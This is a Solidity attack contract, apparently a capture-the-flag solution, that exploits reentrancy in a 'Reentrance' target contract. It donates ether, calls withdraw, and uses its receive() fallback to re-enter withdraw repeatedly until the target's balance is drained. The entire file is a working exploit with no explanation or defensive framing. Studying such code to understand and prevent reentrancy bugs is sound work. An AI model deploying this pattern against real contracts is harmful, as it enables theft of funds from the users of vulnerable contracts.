// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Reentrance} from "./Reentrance.sol";

contract ReentranceHack {
    Reentrance private target;

    constructor(address payable _target) public {
        target = Reentrance(_target);
    }

    function drain() public payable {
        target.donate{value: 1e18}(address(this));
        target.withdraw(1e18);
    }

    receive() external payable {
        uint256 amount = min(1e18, address(target).balance);
        target.withdraw(amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a <= b ? a : b;
    }
}
